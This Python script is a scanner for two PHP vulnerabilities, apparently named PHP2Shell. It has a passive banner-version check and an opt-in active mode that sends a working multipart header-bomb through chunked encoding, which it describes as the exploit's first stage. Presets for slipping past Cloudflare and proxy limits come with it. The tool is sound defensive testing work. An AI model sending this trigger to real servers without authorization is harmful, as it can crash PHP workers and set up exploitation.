#!/usr/bin/env python3
"""
PHP2Shell vulnerability checker (CVE-2026-109618 / CVE-2026-109619).

Two modes:

  PASSIVE (default, safe)
      Reads Server / X-Powered-By banners via HEAD (GET fallback on
      405/501) and compares the advertised PHP version against the
      upstream fixed releases (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12).
      Sends no exploit probes. HTTP headers cannot detect distro
      backports, so an `ok` result describes the advertised version
      only — it does not verify the installed build.

  ACTIVE (--active, opt-in)
      Sends the publicly-documented Stage-1 OOM trigger (a multipart
      header-bomb via chunked transfer encoding) and classifies the
      response. Stronger evidence, but invasive: on a vulnerable
      server this IS the exploit's first stage — it can recycle PHP
      workers and leave request state corrupted. The tool prints a
      warning and asks for confirmation first. Use only against
      systems you are authorized to test.

Exit codes:  0  ok / not vulnerable
             1  (potentially) vulnerable
             2  usage error
             3  unknown / inconclusive / blocked / no response

Usage:
  python3 check_vuln.py http://example.com/index.php              # passive
  python3 check_vuln.py http://example.com --json                 # machine-readable
  python3 check_vuln.py http://example.com/wp-login.php --active  # behavioral
  python3 check_vuln.py http://example.com --active --cloudflare --yes
"""
from __future__ import annotations

import argparse
import json
import re
import socket
import ssl
import sys
import urllib.parse

BOUNDARY = "php2shellCHECKsep"
CRLF = b"\r\n"

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
DIM = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Upstream releases fixing both CVEs (2026-10-21).
FIXED_IN = {
    "8.2": 35,
    "8.3": 36,
    "8.4": 27,
    "8.5": 12,
}
# Branches that are affected and never receive a fix (EOL).
OLDER_BRANCHES = {
    "5.4", "5.5", "5.6",
    "7.0", "7.1", "7.2", "7.3", "7.4",
    "8.0", "8.1",
}
FIXED_LIST = "8.2.35 / 8.3.36 / 8.4.27 / 8.5.12"

# dev/alpha/beta/rc anywhere in the suffix makes the version unclassifiable:
# failing toward "patched" on a prerelease is the wrong failure direction.
PRERELEASE = re.compile(r"(?:^|[-+~.])(?:dev|alpha|beta|rc)", re.I)
VERSION_RE = re.compile(r"\bPHP[ /]([^\s,;)]+)", re.I)


# ────────────────────────── version classification ──────────────────────────

def classify_version(ver: str) -> str:
    """Classify an advertised version: ok / potentially_vulnerable / unknown."""
    m = re.match(r"^(\d+)\.(\d+)\.(\d+)([-+~].*)?$", ver or "")
    if not m:
        return "unknown"
    if PRERELEASE.search(m.group(4) or ""):
        return "unknown"
    branch = f"{int(m.group(1))}.{int(m.group(2))}"
    if branch in OLDER_BRANCHES:
        return "potentially_vulnerable"
    fixed = FIXED_IN.get(branch)
    if fixed is None:
        return "unknown"
    return "potentially_vulnerable" if int(m.group(3)) < fixed else "ok"


def version_vulnerable(ver: str) -> bool | None:
    """True / False / None (unknown) — convenience wrapper for display code."""
    return {"potentially_vulnerable": True, "ok": False,
            "unknown": None}.get(classify_version(ver))


def fixed_release_for(ver: str) -> str:
    """Human-readable fixed release for the version's branch, if any."""
    m = re.match(r"^(\d+)\.(\d+)\.", ver or "")
    if not m:
        return ""
    branch = f"{int(m.group(1))}.{int(m.group(2))}"
    if branch in FIXED_IN:
        return f"8.{branch.split('.')[1]}.{FIXED_IN[branch]}"
    return ""


def pick_version(candidates: list[str]) -> tuple[str | None, str]:
    """Choose among multiple advertised versions.

    Prefer warnings and unrecognized versions over a reassuring banner:
    a proxy advertising PHP 8.4.27 must not mask a backend leaking
    PHP/8.3.30, and an `ok` banner must not downgrade an unknown one.
    """
    version: str | None = None
    status = "unknown"
    for ver in candidates:
        st = classify_version(ver)
        if version is None or st == "potentially_vulnerable" or status == "ok":
            version, status = ver, st
        if status == "potentially_vulnerable":
            break
    return version, status


def passive_reason(ver: str | None, status: str) -> str:
    if status == "potentially_vulnerable":
        fixed = fixed_release_for(ver or "")
        if fixed:
            return (f"PHP {ver}: potentially vulnerable — below the upstream "
                    f"fixed release for its branch ({fixed}). HTTP headers "
                    "cannot tell whether this version contains a backported "
                    "fix.")
        return (f"PHP {ver}: branch no longer receives fixes — no patched "
                "release exists for it. Upgrade to a supported branch "
                f"({FIXED_LIST}).")
    if status == "ok":
        return (f"PHP {ver}: advertised version meets an upstream fixed "
                f"release. Installed build not verified — distro backports "
                "are invisible to banners.")
    if ver:
        return (f"PHP {ver}: prerelease or unrecognized version — cannot "
                "classify from banners.")
    return ("No PHP version disclosed in Server / X-Powered-By banners. "
            "If PHP is deliberately hidden, banners cannot help — use "
            "--active (invasive) or check the server directly.")


# ───────────────────────────── passive mode ─────────────────────────────────

def validate_url(url: str) -> urllib.parse.SplitResult:
    if re.search(r"[\x00-\x20\x7f]", url):
        raise ValueError("URL contains spaces or control characters")
    u = urllib.parse.urlsplit(url)
    if u.scheme not in ("http", "https"):
        raise ValueError("Use an http:// or https:// URL")
    if u.username or u.password:
        raise ValueError("URL credentials are not supported")
    if not u.hostname:
        raise ValueError("URL has no hostname")
    return u


def fetch_banner_headers(u: urllib.parse.SplitResult,
                         timeout: float) -> tuple[int, list[str]]:
    """HEAD, falling back to GET on 405/501; collect Server/X-Powered-By."""
    is_https = u.scheme == "https"
    host = u.hostname or ""
    port = u.port or (443 if is_https else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    banners: list[str] = []
    status = 0
    for method in ("HEAD", "GET"):
        req = (f"{method} {path} HTTP/1.1\r\n"
               f"Host: {host}\r\n"
               "Connection: close\r\n"
               "\r\n").encode()
        status, hdrs, _ = send_raw(host, port, is_https, req, timeout)
        banners.append(hdrs.get("server", ""))
        banners.append(hdrs.get("x-powered-by", ""))
        if status not in (405, 501):
            break
    return status, banners


def run_passive(url: str, timeout: float) -> dict:
    result: dict = {
        "mode": "passive",
        "url": url,
        "patch_status": "unknown",
        "php_version": None,
        "reason": "",
    }
    try:
        u = validate_url(url)
        status, banners = fetch_banner_headers(u, timeout)
    except ValueError as e:
        result["reason"] = str(e)
        result["exit_code"] = 2
        return result
    except (OSError, ssl.SSLError) as e:
        result["reason"] = f"no response from target: {e}"
        result["exit_code"] = 3
        return result

    result["banners"] = [b for b in banners if b]
    if status == 0:
        result["reason"] = "no response from target"
        result["exit_code"] = 3
        return result

    header_text = "\n".join(banners)
    ver, cls = pick_version(VERSION_RE.findall(header_text))
    result["php_version"] = ver
    result["patch_status"] = cls
    result["reason"] = passive_reason(ver, cls)
    result["exit_code"] = {"ok": 0, "potentially_vulnerable": 1,
                           "unknown": 3}[cls]
    return result


# ────────────────────────────── active mode ─────────────────────────────────

def build_payload(parts: int = 1, headers: int = 300_000,
                  strategy: str = "concentrated") -> bytes:
    bb = f"--{BOUNDARY}".encode()
    out = bytearray()
    if strategy == "spread":
        per_part = max(1, headers // parts)
        for p in range(parts):
            out += bb + CRLF
            out += f'Content-Disposition: form-data; name="f{p}"; filename=""'.encode() + CRLF
            out += b"Content-Type: application/octet-stream" + CRLF
            start = p * per_part
            count = per_part if p < parts - 1 else headers - start
            for h in range(count):
                out += b"X-P%d: x" % (start + h) + CRLF
            out += CRLF + CRLF
    else:
        for p in range(parts):
            out += bb + CRLF
            out += f'Content-Disposition: form-data; name="f{p}"; filename=""'.encode() + CRLF
            out += b"Content-Type: application/octet-stream" + CRLF
            for h in range(headers):
                out += b"X-P%d: x" % h + CRLF
            out += CRLF + CRLF
    out += f"--{BOUNDARY}--".encode() + CRLF
    return bytes(out)


def chunked_encode(data: bytes, chunk_size: int = 65536) -> bytes:
    out = bytearray()
    for i in range(0, len(data), chunk_size):
        chunk = data[i : i + chunk_size]
        out += f"{len(chunk):x}\r\n".encode()
        out += chunk + b"\r\n"
    out += b"0\r\n\r\n"
    return bytes(out)


def send_raw(host: str, port: int, is_https: bool, request: bytes,
             timeout: float) -> tuple[int, dict, str]:
    """Send raw HTTP and return (status, headers_dict, body_snippet)."""
    if is_https:
        ctx = ssl.create_default_context()
        raw = socket.create_connection((host, port), timeout=timeout)
        sock = ctx.wrap_socket(raw, server_hostname=host)
    else:
        sock = socket.create_connection((host, port), timeout=timeout)

    try:
        sock.sendall(request)
        resp = b""
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 16384:
                    break
            except socket.timeout:
                break
    finally:
        sock.close()

    status = 0
    hdrs: dict[str, str] = {}
    body = ""

    if resp and b"\r\n" in resp:
        try:
            first_line = resp.split(b"\r\n", 1)[0].decode("ascii", errors="replace")
            parts = first_line.split(" ", 2)
            if len(parts) >= 2:
                status = int(parts[1])
        except (ValueError, IndexError):
            pass

        if b"\r\n\r\n" in resp:
            hdr_block, body_raw = resp.split(b"\r\n\r\n", 1)
            body = body_raw[:4096].decode("latin1", errors="replace")
            for line in hdr_block.split(b"\r\n")[1:]:
                line_s = line.decode("latin1", errors="replace")
                if ":" in line_s:
                    k, v = line_s.split(":", 1)
                    hdrs[k.strip().lower()] = v.strip()

    return status, hdrs, body


def detect_php_version(headers: dict[str, str], body: str) -> str | None:
    """Extract PHP version from response headers or body."""
    xpb = headers.get("x-powered-by", "")
    if xpb:
        m = re.search(r"PHP[/ ]+(\d+\.\d+\.\d+\S*)", xpb, re.I)
        if m:
            return m.group(1)

    server = headers.get("server", "")
    if server:
        m = re.search(r"PHP[/ ]+(\d+\.\d+\.\d+\S*)", server, re.I)
        if m:
            return m.group(1)

    if body:
        m = re.search(r"PHP (\d+\.\d+\.\d+)", body)
        if m:
            return m.group(1)

    return None


def detect_sapi(headers: dict[str, str]) -> str | None:
    """Guess the SAPI from response headers."""
    server = headers.get("server", "").lower()
    if "apache" in server:
        return "mod_php (Apache)"
    xpb = headers.get("x-powered-by", "").lower()
    if "apache" in xpb:
        return "mod_php (Apache)"

    via = headers.get("via", "").lower()
    upstream = headers.get("x-upstream", "").lower()
    if "nginx" in server or "nginx" in via or "nginx" in upstream:
        return "PHP-FPM (behind nginx)"

    return None


def active_check(url: str, timeout: float = 10.0, parts: int = 1,
                 headers: int = 300_000, use_chunked: bool = True,
                 strategy: str = "concentrated") -> dict:
    u = urllib.parse.urlsplit(url)
    is_https = u.scheme == "https"
    host = u.hostname or ""
    port = u.port or (443 if is_https else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    payload = build_payload(parts, headers, strategy=strategy)
    wire_mb = len(payload) / 1048576

    req = bytearray()
    req += f"POST {path} HTTP/1.1\r\n".encode()
    req += f"Host: {host}\r\n".encode()
    req += f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n".encode()
    req += b"Connection: close\r\n"

    if use_chunked:
        req += b"Transfer-Encoding: chunked\r\n"
        req += b"\r\n"
        req += chunked_encode(payload)
    else:
        req += f"Content-Length: {len(payload)}\r\n".encode()
        req += b"\r\n"
        req += payload

    status, resp_hdrs, resp_body = send_raw(host, port, is_https, bytes(req), timeout)

    php_ver = detect_php_version(resp_hdrs, resp_body)
    sapi = detect_sapi(resp_hdrs)

    result = {
        "mode": "active",
        "url": url,
        "status": status,
        "wire_mb": wire_mb,
        "php_version": php_ver,
        "sapi": sapi,
    }

    ver_vuln = version_vulnerable(php_ver) if php_ver else None

    # Check for OOM signature in body regardless of status code.
    # With low memory_limit (e.g. 8M), the OOM can fire but Apache may still
    # return HTTP 200 with the fatal error dumped into the body.
    has_oom = ("memory" in resp_body.lower() and "exhausted" in resp_body.lower()) \
              or "Unknown on line 0" in resp_body

    if has_oom:
        result["verdict"] = "VULNERABLE"
        result["detail"] = (
            f"OOM fatal confirmed in response (HTTP {status}). "
            "PHP is unpatched — the fatal fires during request-startup parsing, "
            "before any app code runs."
        )
        result["color"] = RED
    elif status == 500:
        result["verdict"] = "LIKELY VULNERABLE"
        result["detail"] = (
            "HTTP 500 — the OOM fatal likely fired but display_errors is Off. "
            "Check PHP error log for: "
            "\"Allowed memory size ... exhausted ... in Unknown on line 0\""
        )
        result["color"] = RED
    elif status == 502:
        result["verdict"] = "LIKELY VULNERABLE (FPM)"
        result["detail"] = (
            "PHP-FPM child crashed (OOM fatal). FPM recycles the child, so the "
            "mod_php exploit path doesn't apply directly, but both CVEs list FPM "
            "as susceptible via an app-dependent path."
        )
        result["color"] = YELLOW
    elif status == 200:
        if ver_vuln is True:
            result["verdict"] = "POSSIBLY VULNERABLE"
            result["detail"] = (
                f"HTTP 200 but PHP {php_ver} is in the vulnerable range. "
                "A reverse proxy may have blocked the trigger — "
                "test the PHP port directly to confirm."
            )
            result["color"] = YELLOW
        elif ver_vuln is False:
            result["verdict"] = "NOT VULNERABLE"
            result["detail"] = (
                f"PHP {php_ver} meets an upstream fixed release and handled "
                "the trigger normally. Advertised version only — the "
                "installed build was not verified."
            )
            result["color"] = GREEN
        else:
            result["verdict"] = "PATCHED OR BLOCKED"
            result["detail"] = (
                "Server handled the payload normally — PHP is patched, or a "
                "reverse proxy blocked the trigger before PHP saw it. "
                "Inconclusive without version info."
            )
            result["color"] = YELLOW
    elif status == 400:
        result["verdict"] = "INCONCLUSIVE"
        result["detail"] = (
            "Server rejected the request. A reverse proxy or the HTTP server "
            "blocked the chunked TE. Try --no-chunk, or test the PHP port directly."
        )
        result["color"] = YELLOW
    elif status == 413:
        result["verdict"] = "BLOCKED BY PROXY"
        result["detail"] = (
            "Body rejected as too large. This does not confirm PHP is patched — "
            "the proxy stopped the payload before it reached PHP."
        )
        result["color"] = YELLOW
    elif status == 403:
        result["verdict"] = "BLOCKED BY WAF"
        result["detail"] = "WAF or access control blocked the request."
        result["color"] = YELLOW
    elif status == 0:
        result["verdict"] = "NO RESPONSE"
        result["detail"] = "Server did not respond. Check URL and port."
        result["color"] = DIM
    else:
        if ver_vuln is False and status in (200, 301, 302, 303):
            result["verdict"] = "NOT VULNERABLE"
            result["detail"] = (
                f"HTTP {status} — the trigger was delivered and PHP {php_ver} "
                "handled it normally (no OOM fatal, the application ran). "
                "Meets an upstream fixed release; advertised version only — "
                "the installed build was not verified."
            )
            result["color"] = GREEN
        else:
            result["verdict"] = "INCONCLUSIVE"
            result["detail"] = f"HTTP {status} — cannot determine vulnerability."
            result["color"] = YELLOW

    # If we have version info and the trigger-based verdict was inconclusive,
    # add a version-based note
    if ver_vuln is True and "VULNERABLE" not in result["verdict"]:
        fixed = fixed_release_for(php_ver or "")
        result["version_note"] = (
            f"PHP {php_ver} is in the vulnerable range "
            f"(fixed: {fixed or 'no release for this branch'}). "
            "The trigger was blocked but the server may still be vulnerable."
        )
    elif ver_vuln is False:
        result["version_note"] = (
            f"PHP {php_ver} meets an upstream fixed release (advertised; "
            "installed build not verified)."
        )

    return result


def confirm_active(args: argparse.Namespace) -> bool:
    print(f"  {YELLOW}{BOLD}⚠ ACTIVE MODE{RESET}")
    print("    This sends the Stage-1 OOM trigger (a ~4 MiB multipart header")
    print("    bomb) to the target. On a vulnerable server this is the")
    print("    exploit's first stage: it can recycle PHP workers and leave")
    print("    request state corrupted. Only run it against systems you are")
    print("    authorized to test.")
    if args.yes:
        print(f"    {DIM}(--yes given, skipping confirmation){RESET}")
        return True
    if not sys.stdin.isatty():
        print(f"    {RED}Refusing to run non-interactively without --yes.{RESET}")
        return False
    try:
        ans = input("    Continue? [y/N] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    return ans in ("y", "yes")


# ─────────────────────────────── main ───────────────────────────────────────

def main() -> int:
    ap = argparse.ArgumentParser(
        description="PHP2Shell vulnerability checker — CVE-2026-109618 / CVE-2026-109619",
        epilog="Default is a passive banner check (no exploit probes). "
               "--active sends the Stage-1 OOM trigger and asks for confirmation. "
               "Exit codes: 0 ok, 1 (potentially) vulnerable, 2 usage, 3 unknown.",
    )
    ap.add_argument("url", nargs="?", help="target URL (any PHP endpoint)")
    ap.add_argument("-u", "--url-flag", dest="url_alt", metavar="URL",
                    help="target URL (alternative to positional)")
    ap.add_argument("--timeout", type=float, default=10.0,
                    help="HTTP timeout in seconds (default: 10)")
    ap.add_argument("--json", action="store_true",
                    help="machine-readable JSON output")
    ap.add_argument("--active", action="store_true",
                    help="send the Stage-1 OOM trigger (invasive; asks for "
                         "confirmation unless --yes)")
    ap.add_argument("--yes", action="store_true",
                    help="skip the --active confirmation prompt")

    g = ap.add_argument_group("active mode only (require --active)")
    g.add_argument("--parts", type=int, default=None,
                   help="multipart parts in the payload (default: 1)")
    g.add_argument("--headers", type=int, default=None,
                   help="header lines total (default: 300000, ~3.9 MiB)")
    g.add_argument("--no-chunk", action="store_true", default=None,
                   help="send with Content-Length instead of chunked TE "
                        "(use if server returns 400 on chunked)")
    g.add_argument("--strategy", choices=("concentrated", "spread"), default=None,
                   help="concentrated: all headers in one part (default); "
                        "spread: distribute across parts (for proxies that "
                        "limit per-part MIME headers)")
    g.add_argument("--cloudflare", action="store_true", default=None,
                   help="preset for Cloudflare-fronted targets: --no-chunk "
                        "--strategy spread --parts 100 --headers 300000")
    args = ap.parse_args()

    # Active-only flags gate the only dangerous code path.
    if not args.active:
        provided = [f"--{n}" for n in ("parts", "headers", "no_chunk",
                                       "strategy", "cloudflare")
                    if getattr(args, n) is not None]
        if provided:
            ap.error(f"{', '.join(provided)} require --active "
                     "(passive mode sends no exploit probes)")

    url = args.url or args.url_alt
    if not url:
        ap.error("url is required: check_vuln.py <url>  or  check_vuln.py -u <url>")

    print(f"\n{BOLD}PHP2Shell Vulnerability Checker{RESET}")
    print(f"{DIM}CVE-2026-109618 / CVE-2026-109619{RESET}")

    # ── passive ──
    if not args.active:
        print(f"{DIM}passive mode — banner check only, no exploit probes{RESET}\n")
        r = run_passive(url, args.timeout)
        if r["exit_code"] == 2:
            print(f"  {RED}ERROR{RESET}: {r['reason']}\n")
            return 2

        cls = r["patch_status"]
        color = {"potentially_vulnerable": YELLOW, "ok": GREEN}.get(cls, DIM)
        label = {"potentially_vulnerable": "POTENTIALLY VULNERABLE",
                 "ok": "OK"}.get(cls, "UNKNOWN")

        print(f"  {BOLD}Results{RESET}")
        print(f"  {'─' * 50}")
        print(f"  Target:       {url}")
        if r.get("banners"):
            print(f"  Banners:      {r['banners'][0]}")
            for b in r["banners"][1:]:
                print(f"  {' ' * 14}{b}")
        else:
            print(f"  Banners:      {DIM}none{RESET}")
        print(f"  PHP version:  "
              + (r["php_version"] if r["php_version"] else f"{DIM}not disclosed{RESET}"))
        print()
        print(f"  {color}■{RESET} {color}{BOLD}{label}{RESET}")
        print(f"    {r['reason']}")
        if cls == "potentially_vulnerable":
            print()
            print(f"  {BOLD}Action required:{RESET}")
            print(f"    Upgrade to PHP {FIXED_LIST}+ and restart all PHP workers.")
        print()
        if not args.json and cls != "ok":
            print(f"  {DIM}Stronger evidence: re-run with --active (sends the "
                  f"Stage-1 trigger — invasive).{RESET}\n")

        if args.json:
            print(json.dumps(r, indent=2))
        return r["exit_code"]

    # ── active ──
    print(f"{DIM}active mode — sends the Stage-1 OOM trigger{RESET}\n")
    if not confirm_active(args):
        print(f"\n  {DIM}Aborted — no request sent.{RESET}\n")
        return 3

    parts = args.parts if args.parts is not None else 1
    headers = args.headers if args.headers is not None else 300_000
    no_chunk = bool(args.no_chunk)
    strategy = args.strategy or "concentrated"
    if args.cloudflare:
        no_chunk = True
        strategy = "spread"
        if parts == 1:
            parts = 100

    heap_mb = parts * headers * 320 / 1048576
    print(f"  Target:   {url}")
    print(f"  Payload:  {parts} part(s) x {headers:,} headers = ~{heap_mb:.0f} MiB PHP heap")
    print(f"  Method:   {'Content-Length' if no_chunk else 'chunked TE (bypasses post_max_size)'}")
    print(f"  Strategy: {strategy}{' (Cloudflare preset)' if args.cloudflare else ''}")
    print()

    try:
        r = active_check(url, args.timeout, parts, headers,
                         use_chunked=not no_chunk, strategy=strategy)
    except ConnectionRefusedError:
        print(f"  {RED}CONNECTION REFUSED{RESET} — is the server running?\n")
        return 3
    except socket.timeout:
        print(f"  {YELLOW}TIMEOUT{RESET} — no response within {args.timeout}s\n")
        return 3
    except Exception as e:  # noqa: BLE001 — report and keep going
        print(f"  {RED}ERROR{RESET}: {e}\n")
        return 3

    verdict = r["verdict"]
    if verdict == "NOT VULNERABLE":
        r["exit_code"] = 0
    elif "VULNERABLE" in verdict:      # VULNERABLE / LIKELY / POSSIBLY
        r["exit_code"] = 1
    else:
        r["exit_code"] = 3

    # ---- Results ----
    print(f"  {BOLD}Results{RESET}")
    print(f"  {'─' * 50}")
    print(f"  HTTP status:  {r['status']}")

    if r["php_version"]:
        ver = r["php_version"]
        vuln = version_vulnerable(ver)
        if vuln is True:
            print(f"  PHP version:  {RED}{ver} (VULNERABLE){RESET}")
        elif vuln is False:
            print(f"  PHP version:  {GREEN}{ver} (meets a fixed release){RESET}")
        else:
            print(f"  PHP version:  {ver}")
    else:
        print(f"  PHP version:  {DIM}not disclosed{RESET}")

    if r["sapi"]:
        print(f"  SAPI:         {r['sapi']}")

    print(f"  Wire size:    {r['wire_mb']:.1f} MiB")
    print()

    # ---- Verdict ----
    color = r.get("color", RESET)
    if verdict == "NOT VULNERABLE":
        icon = f"{GREEN}■{RESET}"
    elif verdict == "VULNERABLE":
        icon = f"{RED}■{RESET}"
    elif "VULNERABLE" in verdict:      # LIKELY / POSSIBLY
        icon = f"{YELLOW}■{RESET}"
    else:
        icon = f"{DIM}■{RESET}"

    print(f"  {icon} {color}{BOLD}{verdict}{RESET}")
    print(f"    {r['detail']}")

    if r.get("version_note"):
        print(f"    {DIM}{r['version_note']}{RESET}")

    print()

    # ---- Recommendations ----
    if verdict == "NOT VULNERABLE":
        pass
    elif "VULNERABLE" in verdict:      # VULNERABLE / LIKELY / POSSIBLY
        print(f"  {BOLD}Action required:{RESET}")
        print(f"    Upgrade to PHP {FIXED_LIST}+")
        print(f"    Then restart all PHP workers.")
        print()
        print(f"  {DIM}References:{RESET}")
        print(f"  {DIM}  CVE-2026-109618  GHSA-w8hw-w9fx-j79w{RESET}")
        print(f"  {DIM}  CVE-2026-109619  GHSA-6wmf-4rv5-p3rp{RESET}")
        print()
    elif verdict in ("INCONCLUSIVE", "BLOCKED BY PROXY", "BLOCKED BY WAF",
                     "PATCHED OR BLOCKED"):
        print(f"  {BOLD}Next steps:{RESET}")
        if r["status"] == 400 and not no_chunk:
            print(f"    1. Retry with --no-chunk:")
            print(f"       python3 check_vuln.py --active --no-chunk {url}")
        if not args.cloudflare:
            print(f"    {'2' if r['status'] == 400 else '1'}. Behind Cloudflare? Try:")
            print(f"       python3 check_vuln.py --active --cloudflare {url}")
        print(f"    {'3' if r['status'] == 400 else '2'}. Test the PHP port directly (bypass proxy/WAF)")
        print(f"    {'4' if r['status'] == 400 else '3'}. Check PHP version:  php -v")
        print()

    if args.json:
        print(json.dumps(r, indent=2))
    return r["exit_code"]


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
